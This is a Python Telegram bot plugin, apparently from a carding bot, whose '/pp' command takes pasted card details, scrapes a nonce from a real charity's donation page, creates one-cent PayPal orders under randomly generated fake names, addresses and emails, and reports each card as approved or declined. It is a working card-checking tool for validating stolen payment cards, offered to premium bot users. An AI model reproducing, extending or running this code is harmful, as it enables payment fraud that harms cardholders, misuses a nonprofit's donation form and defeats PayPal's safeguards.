import json
from values import *
import platform
import names
import random_address
import aiohttp
import certifi
import ssl
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 


import random
import string
from datos import idchat



@Client.on_message(filters.command(["pp"], ["/", "."]))
async def xi(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/bg card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/bg card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]


            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            session = requests.Session()

            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
            reply = await message.reply_text("<b>Cargando proceso...</b>")        
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            tiempo_inicio = time.perf_counter()
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""<b>⎚Gateway| Paypal
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            


   
    #-----------------------------------------------------------------------------------------------
           
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            conn = aiohttp.TCPConnector(ssl=ssl_context)
            async with aiohttp.ClientSession(connector=conn) as session:
                rand1 = random.randint(1000,9999)
                rand2 = random.randint(10000,99999)
        
                genaddr = random_address.real_random_address()
                address = genaddr['address1']
            
                City = genaddr['city']
    
                State = genaddr['state']
                Zip_Code = genaddr['postalCode']
                
                    
                session.headers.update({
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                    })
                async with session.get('https://schoolforstrings.org/donate/') as resp:
                                   
                 response = await resp.text()
                 lines = response.split("\n")
                 for i in lines:
                        
                  if "gforms_ppcp_frontend_strings" in i:
                     sucio = i
                     create_order_nonce = sucio.replace('var gforms_ppcp_frontend_strings = ',"").replace(';',"")
                     create_order_nonce = json.loads(create_order_nonce)
                     create_order_nonce = create_order_nonce['create_order_nonce']
                    
                            
                headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                        'Accept': '*/*',
                        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        'Referer': 'https://schoolforstrings.org/donate/',
                        'content-type': 'application/json',
                        'Origin': 'https://schoolforstrings.org',
                        'Connection': 'keep-alive',
                    }
        
                    
                params = {
                        'action': 'gfppcp_create_order',
                    }
                    
                correorand = f"KimerJimenezz{rand1}{rand2}@gmail.com"
                data = {
                        "nonce":create_order_nonce,
                        "data":{
                            "payer":{
                                "name":{
                                    "given_name":names.get_first_name(),
                                    "surname":names.get_last_name()
                                },
                                "email_address":correorand
                            },
                            "purchase_units":[
                                {
                                    "amount":{
                                        "value":"0.01",
                                        "currency_code":"USD",
                                        "breakdown":{
                                            "item_total":{
                                                "value":"0.01",
                                                "currency_code":"USD"
                                            },
                                            "shipping":{
                                                "value":"0",
                                                "currency_code":"USD"
                                            }
                                        }
                                    },
                                    "description":"PayPal Commerce Platform Feed 1",
                                    "items":[
                                        {
                                            "name":"Other Amount",
                                            "description":"",
                                            "unit_amount":{
                                                "value":"0",
                                                "currency_code":"USD"
                                            },
                                            "quantity":1
                                        },
                                        {
                                            "name":"Other Amount",
                                            "description":"",
                                            "unit_amount":{
                                                "value":"0.01",
                                                "currency_code":"USD"
                                            },
                                            "quantity":1
                                        }
                                    ],
                                    "shipping":{
                                        "name":{
                                            "full_name":names.get_full_name()
                                        }
                                    }
                                }
                            ],
                            "application_context":{
                                "shipping_preference":"GET_FROM_FILE"
                            }
                        },
                        "form_id":6,
                        "feed_id":"2"
        
                    }
                res = requests.post('https://schoolforstrings.org/wp-admin/admin-ajax.php', params=params, headers=headers, json=data)
                print(res.text)
                if 'orderID' in res.text:
                  orderID = res.json()['data']['orderID']
                
                
                
                            #idrecurly = response['id']
       
                headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                        'Accept': '*/*',
                        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        #'Referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_5628c2812d_mtq6ndu6ndi&buttonSessionID=uid_5ff42877b6_mtq6ndu6ndu&locale.x=es_ES&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jb21wb25lbnRzPWhvc3RlZC1maWVsZHMlMkNidXR0b25zJTJDbWVzc2FnZXMmY2xpZW50LWlkPUFiVkhHTi1GWGxLTWd2ZU1Bbmt3NWxpUTV3WlhZQTVkQ2FDLVlQWU9pbjVEcU9fZDlSaVItMl9KeWdpUEFUeWNnWHlmWHlVT1B6T2t1TUotJmN1cnJlbmN5PVVTRCZpbnRlZ3JhdGlvbi1kYXRlPTIwMjItMDYtMTEmdmF1bHQ9ZmFsc2UmaW50ZW50PWNhcHR1cmUiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJSb2NrZXRHZW5pdXNfUENQIiwiZGF0YS11aWQiOiJ1aWRfa3p0cGh3c2l1amRmYmpkd3d6cGpycHB4bnJyZHRjIn19&disable-card=&token=3T426684S2194625V',
                        'x-country': 'US',
                        'content-type': 'application/json',
                        'x-app-name': 'standardcardfields',
                        'paypal-client-context': orderID,
                        'paypal-client-metadata-id': orderID,
                        'Origin': 'https://www.paypal.com',
                        'Connection': 'keep-alive',
                    }
                data = {
                        "query":" mutation payWithCard( $token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int ) { approveGuestPaymentWithCreditCard( token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm ) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } } ",
                        "variables":{
                            "token": orderID,
                            "card":{
                                "cardNumber": cc,
                                "expirationDate":f"{mes}/{ano}",
                                "postalCode": Zip_Code,
                                "securityCode":cvv
                            },
                            "phoneNumber":f"20{random.randint(0,9)}{random.randint(1700,8065)}{random.randint(8,9)}65",
                            "firstName":names.get_first_name(),
                            "lastName":names.get_last_name(),
                            "billingAddress":{
                                "givenName":names.get_first_name(),
                                "familyName":names.get_last_name(),
                                "line1": address,
                                "line2":"",
                                "city": City,
                                "state": State,
                                "postalCode": Zip_Code,
                                "country":"US"
                            },
                            "shippingAddress":{
                                "givenName":names.get_first_name(),
                                "familyName":names.get_last_name(),
                                "line1": address,
                                "line2":"",
                                "city": City,
                                "state": State,
                                "postalCode": Zip_Code,
                                "country":"US"
                            },
                            "email": correorand,
                            "currencyConversionType":"PAYPAL"
                        },
                        "operationName":False
        
                    }
                response1 = requests.post('https://www.paypal.com/graphql?fetch_credit_form_submit', json=data,  headers=headers)
                print(response1.text)
                                     
            await reply.edit_text(f"""<b>⎚Gateway| Paypal
Card: <code>{ccs}</code>
Progress 🟠 2.50(s)</b>""")
            
               
            if 'NEED_CREDIT_CARD' in response1:
              status = "Approved✅"
              mpay = "Charged 0.01$"
            elif 'EXISTING_ACCOUNT_RESTRICTED' in response1:
              status = "Approved✅"
              mpay = "EXISTING_ACCOUNT_RESTRICTED"
            elif 'INVALID_SECURITY_CODE' in response1:
              status = "Approved CCN✅"
              mpay = "INVALID_SECURITY_CODE"
            elif 'NON_PAYABLE' in response1:
              status = "Declined❌"
              mpay = "CARD_GENERIC_ERROR"
            elif 'CANNOT_CLEAR_3DS_CONTINGENCY' in response1:
              status = "Declined❌"
              mpay = "CANNOT_CLEAR_3DS_CONTINGENCY"
            elif '3DS_ERROR' in response1:
              status = "Declined❌"
              mpay = "3DS_ERROR"
            elif 'is3DSecureRequired' in response1:
              status = "Declined❌"
              mpay = "is3DSecureRequired"
            else:
              status = "Declined❌"
              mpay = "Validation Error"
            
            await reply.edit_text(f"""
<b> 

⊗ Card - <code>{ccs}</code> 
⊗ Status - {status}
⊗ Response - {mpay}
⊗ GATEWAY- Paypal
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: ♻️
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>
            """)
            
                
           
            